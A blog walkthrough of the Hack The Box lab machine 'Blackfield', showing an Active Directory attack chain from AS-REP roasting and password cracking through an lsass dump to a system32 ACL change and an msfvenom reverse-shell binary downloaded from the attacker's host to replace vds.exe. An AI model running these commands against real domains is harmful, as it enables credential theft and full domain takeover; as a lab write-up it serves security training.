---
layout: post
title: HTB Blackfield Walkthrough
date: 2020-10-16 14:24:24 +0800
categories: htb
---

![HTB Image](/assets/post3/htb_image.png)

The first thing that we do is conduct an NMAP scan and the following are the results of the scan
 ```
# Nmap 7.80 scan initiated Sun Aug 30 13:56:02 2020 as: nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -T4 -oA tcp-full blackfield.htb
Nmap scan report for blackfield.htb (10.10.10.192)
Host is up (0.19s latency).
rDNS record for 10.10.10.192: blackfield

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-30 12:58:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/30%Time=5F4B3F7E%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m04s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-08-30T13:00:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 30 13:59:12 2020 -- 1 IP address (1 host up) scanned in 189.39 seconds

```

Full enumeration was conducted, but for brevity, the following will cover just those ports/services that are required to meet the objective.

We run `smbmap` using a guest account to see what shares are available on the target machine. 

```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# smbmap -u "guest" -H blackfield.htb
[+] IP: blackfield.htb:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```
What is interesting is the `profiles$` directory that we have Read Only access to.  When them enumerate that directory and see that it provides us with a list of potential usernames
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]                                                             
└─# smbmap -u "guest" -H blackfield.htb -r profiles$                                        
[+] IP: blackfield.htb:445      Name: unknown                                                
        Disk                                                    Permissions     Comment                
        ----                                                    -----------     -------   
        profiles$                                               READ ONLY                          
        .\profiles$\*                                                                                  
        dr--r--r--                0 Thu Jun  4 00:47:12 2020    .                                  
        dr--r--r--                0 Thu Jun  4 00:47:12 2020    ..                                     
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AAlleni                                
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ABarteski                              
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ABekesz                 
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ABenzies               
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ABiemiller             
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AChampken
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ACheretei                              
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ACsonaki    
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AHigchens
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AJaquemai
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AKlado   
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AKoffenburger                       
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AKollolli   
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AKruppe                             
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AKubale        
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ALamerz    
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AMaceldon                           
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    AMasalunga         
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ANavay                    
        dr--r--r--                0 Thu Jun  4 00:47:11 2020    ANesterova
.... <snip>
```
Now that we have a list of users we will try and query AD to get a Hash that we could exploit.  We will use `GetNPUsers.py` from Impacket 
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]                                                             
└─# GetNPUsers.py -request -usersfile profiles.out -outputfile hashes -format john -dc-ip 10.10.10.192 blackfield.local/
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation                                     
                                                                                                       
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
``` 

We have found one user that we can exploit as can be seen when we look at the output from the above Impacket script
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# cat hashes                                                                                                                                                                                           130 ⨯
$krb5asrep$support@BLACKFIELD.LOCAL:839999b19d5b646dfc54cc268d105fb5$25ff287315c7145d0fde9e28efb023b371da9e952135cd19e6369f8e19d3c1295866b04c84cd70a4c36b667cb639930dac1b300fad50379f290dde835dff61ed6f33c18b0a68acf76396d416f0cbecc8249f0569ccae9485b5937b454eec194342078c605740600de136b53221a136bffe5186124839e7ccde3f7635fca1ddc302bbbd8ee2f6028dd65f781872c9632e9368b8fa9d59396527deb270c120c5e8cd94948fa459511407827330d2621e57941528926d14cc2478d9c835544358474f74c1dc0925f283f4ea9dfb88bba8ee50abdd995f57658dce143988a9ab46937c98ade310aa46783b3be33e243b4d9e3b63b81a
```

We will use John to crack the password
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes                                                                                                                                                1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)
1g 0:00:00:14 DONE (2020-08-30 14:55) 0.07057g/s 1011Kp/s 1011Kc/s 1011KC/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We have a password and can validate that it works correctly and have validated that it is correct
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# cme smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares 
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

As part of enumerating LDAP, we have identified the account "audit2020" doesn't have the attribute `admincount` set.  One point to note is that once a user is removed from a privileged group, they still maintain the adminCount value of 1, but are no longer considered a protected object by Active Directory. That means the AdminSDHolder permissions will not be applied to them. However, they will likely have a version of the AdminSDHolder permissions still set because inheritance of their permissions will still be disabled as a remnant of when they were protected by the AdminSDHolder permissions.

```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]                                                                                                                                                                     
└─# ldapsearch -h 10.10.10.192 -x -D 'support@blackfield.local' -w '#00^BlackKnight' -b 'cn=users,dc=blackfield,dc=local' '(admincount=1)' samaccountname                                                249 ⨯ 
# extended LDIF                                                                                                                                                                                                
#                                                                                                                                                                                                              
# LDAPv3                                                                                                                                                                                                       
# base <cn=users,dc=blackfield,dc=local> with scope subtree                                                                                                                                                    
# filter: (admincount=1)                                                                                                                                                                                       
# requesting: samaccountname                                                                                                                                                                                   
#                                                                                                                                                                                                              
                                                                                                                                                                                                               
# krbtgt, Users, BLACKFIELD.local                                                                                                                                                                              
dn: CN=krbtgt,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                                  
sAMAccountName: krbtgt                                                                                                                                                                                         
                                                                                                                                                                                                               
# Domain Controllers, Users, BLACKFIELD.local                                                                                                                                                                  
dn: CN=Domain Controllers,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                      
sAMAccountName: Domain Controllers                                                                                                                                                                             
                                                                                                                                                                                                               
# Schema Admins, Users, BLACKFIELD.local                                                                                                                                                                       
dn: CN=Schema Admins,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                           
sAMAccountName: Schema Admins                                                                                                                                                                                  
                                                                                                                                                                                                               
# Enterprise Admins, Users, BLACKFIELD.local                                                                                                                                                                   
dn: CN=Enterprise Admins,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                       
sAMAccountName: Enterprise Admins                                                                                                                                                                              
                                                                                                                                                                                                               
# Domain Admins, Users, BLACKFIELD.local                                                                                                                                                                       
dn: CN=Domain Admins,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                           
sAMAccountName: Domain Admins                                                                                                                                                                                  
                                                                                                                                                                                                               
# Read-only Domain Controllers, Users, BLACKFIELD.local                                                                                                                                                        
dn: CN=Read-only Domain Controllers,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                            
sAMAccountName: Read-only Domain Controllers                                                                                                                                                                   
                                                                                                                                                                                                               
# Key Admins, Users, BLACKFIELD.local                                                                                                                                                                          
dn: CN=Key Admins,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                              
sAMAccountName: Key Admins                                                                                                                                                                                     
                                                                                                                                                                                                               
# Enterprise Key Admins, Users, BLACKFIELD.local                                                                                                                                                               
dn: CN=Enterprise Key Admins,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                   
sAMAccountName: Enterprise Key Admins                                                                                                                                                                          
                                                                                                                                                                                                               
# Administrator, Users, BLACKFIELD.local                                                                                                                                                                       
dn: CN=Administrator,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                           
sAMAccountName: Administrator                                                                                                                                                                                  
                                                                                                                                                                                                               
# svc_backup, Users, BLACKFIELD.local                                                                                                                                                                          
dn: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local                                                                                                                                                              
sAMAccountName: svc_backup

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
```

We can see that the account of "audit2020" is not listed above
```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# ldapsearch -h 10.10.10.192 -x -D 'support@blackfield.local' -w '#00^BlackKnight' -b 'cn=users,dc=blackfield,dc=local' '(name=audit2020)' samaccountname admincount
# extended LDIF
#
# LDAPv3
# base <cn=users,dc=blackfield,dc=local> with scope subtree
# filter: (name=audit2020)
# requesting: samaccountname admincount 
#

# audit2020, Users, BLACKFIELD.local
dn: CN=audit2020,CN=Users,DC=BLACKFIELD,DC=local
sAMAccountName: audit2020

# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```

Using `rpcclient` we can now set the password for this account to the same as the support account user

```
rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 audit2020 23 #00^BlackKnight
```

Now that we have set the password on this account we can go and see if we have access to any other shares that we previously saw listed

```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# cme smb 10.10.10.192 -u audit2020 -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

As you can see we now have access to the "forensic" share with the user account "audit2020"

We connect to the share and there are some interesting directories worth exploring.

```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield]
└─# smbmap -u audit2020 -p '#00^BlackKnight' -H 10.10.10.192 -r forensic
[+] IP: 10.10.10.192:445        Name: blackfield                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        forensic                                                READ ONLY
        .\forensic\*
        dr--r--r--                0 Sun Feb 23 23:10:16 2020    .
        dr--r--r--                0 Sun Feb 23 23:10:16 2020    ..
        dr--r--r--                0 Mon Feb 24 02:14:37 2020    commands_output
        dr--r--r--                0 Fri May 29 04:29:24 2020    memory_analysis
        dr--r--r--                0 Sat Feb 29 06:30:34 2020    tools
```

Under the directory "memory_analysis" there is a file called "lsass.zip" which by the name we could assume that it Local Security Authority Subsystem Service (LSASS) that is responsible for enforcing the security policy on the system.

We have copied the zip file across to a Windows machine and used Mimikatz to extract the password from the offline memory dump

![Mimikatz ](/assets/post3/mimikatz.png)

We have found the password for the account "svc_backup" and we can now try and use that to login to the machine.

![Evil-WinRM](/assets/post3/evil-winrm.png)

We have been able to logon and when we run `whoami /all` to see what privileges we have.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

From reviewing the access to the permissions, we can see that we could use Robocopy to read restricted files.

```
*Evil-WinRM* PS C:\Users\svc_backup\downloads> ls -force -recurse -erroraction silentlycontinue -path c:\users\administrator\desktop


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        5/26/2020   5:39 PM            282 desktop.ini
-a----        2/28/2020   4:36 PM            447 notes.txt
-ar---        5/28/2020  10:09 AM             32 root.txt


*Evil-WinRM* PS C:\Users\svc_backup\downloads> robocopy 'c:\users\administrator\desktop' 'c:\users\svc_backup\downloads' notes.txt /zb

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, August 30, 2020 9:24:33 AM
   Source : c:\users\administrator\desktop\
     Dest : c:\users\svc_backup\downloads\

    Files : notes.txt

  Options : /DCOPY:DA /COPY:DAT /ZB /R:1000000 /W:30

------------------------------------------------------------------------------

                    1 c:\users\administrator\desktop\
     New File          447 notes.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :       447       447         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Sunday, August 30, 2020 9:24:33 AM
```

The following is the content on the file `notes.txt` 

```
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

We will modify the permissions on the system32 folder so that we can elevate our privileges using the following script:

```powershell
$user = "BLACKFIELD\svc_backup"
$folder = "c:\windows\system32"
$acl = Get-Acl $folder
$aclperms = $user,"FullControl","ContainerInherit,ObjectInherit","None","Allow"
$aclrule = new-object system.security.accesscontrol.filesystemaccessrule $aclperms
$acl.addaccessrule($aclrule)
set-acl -path $folder -aclobject $acl
get-acl $folder | fl
```

The following are the current permissions on `c:\windows\system32` 

```
*Evil-WinRM* PS C:\Users\svc_backup\downloads> get-acl c:\windows\system32 | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32
Owner  : NT SERVICE\TrustedInstaller
Group  : NT SERVICE\TrustedInstaller
Access : CREATOR OWNER Allow  268435456
         NT AUTHORITY\SYSTEM Allow  268435456
         NT AUTHORITY\SYSTEM Allow  Modify, Synchronize
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Administrators Allow  Modify, Synchronize
         BUILTIN\Users Allow  -1610612736
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         NT SERVICE\TrustedInstaller Allow  268435456
         NT SERVICE\TrustedInstaller Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464G:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;
         BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICI
         IO;GXGR;;;S-1-15-2-2)
```

We have copied over the above file to the target machine

```
(New-Object net.webclient).downloadfile('http://10.10.14.xx/modify-privs.ps1','c:\users\svc_backup\downloads\modify-privs.ps1')
```

We have executed the command `.\modify-privs.ps1`

```
*Evil-WinRM* PS C:\Users\svc_backup\downloads> .\modify-privs.ps1

Path   : Microsoft.PowerShell.Core\FileSystem::C:\windows\system32
Owner  : NT SERVICE\TrustedInstaller
Group  : NT SERVICE\TrustedInstaller
Access : CREATOR OWNER Allow  268435456
         NT AUTHORITY\SYSTEM Allow  268435456
         NT AUTHORITY\SYSTEM Allow  Modify, Synchronize
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Administrators Allow  Modify, Synchronize
         BUILTIN\Users Allow  -1610612736
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BLACKFIELD\svc_backup Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464G:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;
         BU)(A;;0x1200a9;;;BU)(A;OICI;FA;;;S-1-5-21-4194615774-2175524697-3563712290-1413)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;OICIIO;G
         XGR;;;AC)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;S-1-15-2-2)(A;;0x1200a9;;;S-1-15-2-2)
```

As we now have the right permissions we will create a payload with `msfvenom`

```
┌──(root💀kali)-[/mnt/hgfs/HTB/Blackfield/forensics]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.xx LPORT=9001 -f exe -o revshell.exe                                                                                                          2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```

We need to find a service that we can stop and start

```
*Evil-WinRM* PS C:\Users\svc_backup\downloads> sc.exe query vds

SERVICE_NAME: vds
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc_backup\downloads> sc.exe stop vds
[SC] ControlService FAILED 1062:

The service has not been started.
```

We shall make a backup copy of the file

```
*Evil-WinRM* PS C:\Users\svc_backup\downloads> cd c:\windows\system32
*Evil-WinRM* PS C:\windows\system32> mv vds.exe vds.exe.backup
*Evil-WinRM* PS C:\windows\system32> (New-Object net.webclient).downloadfile('http://10.10.14.96/revshell.exe','c:\windows\system32\vds.exe')
*Evil-WinRM* PS C:\windows\system32> sc.exe start vds
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

We have a shell on our listener.

Given that the permissions had been explicitly set on the root file, need to run the command `net user administrator temporarypassword /domain` 

Once we had changed the password then just needed to login as the administrator with the new password and get the flag.

I hope that you all enjoyed my first walkthrough and stay tuned for many more 